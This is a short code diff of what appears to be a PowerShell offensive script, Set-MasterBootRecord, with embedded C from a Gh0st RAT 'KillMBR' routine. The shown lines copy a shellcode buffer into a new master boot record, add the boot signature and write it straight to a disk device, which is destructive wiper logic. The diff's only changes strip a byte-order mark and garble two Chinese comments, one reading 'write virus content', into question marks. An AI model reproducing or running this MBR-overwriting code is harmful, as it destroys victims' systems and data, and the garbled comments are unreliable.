@@ -1,4 +1,4 @@
-﻿function Set-MasterBootRecord
+function Set-MasterBootRecord
 {
 <#
 .SYNOPSIS
@@ -57,7 +57,7 @@ int CGh0stApp::KillMBR()
 	DWORD dwBytesWritten, dwBytesReturned; 
 	BYTE pMBR[512] = {0}; 
 	 
-	// 重新构造MBR 
+	// ????MBR 
 	memcpy(pMBR, scode, sizeof(scode) - 1); 
 	pMBR[510] = 0x55; 
 	pMBR[511] = 0xAA; 
@@ -85,7 +85,7 @@ int CGh0stApp::KillMBR()
 		&dwBytesReturned,  
 		NULL 
 		); 
-	// 写入病毒内容 
+	// ?????? 
 	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL); 
 	DeviceIoControl 
 		( 
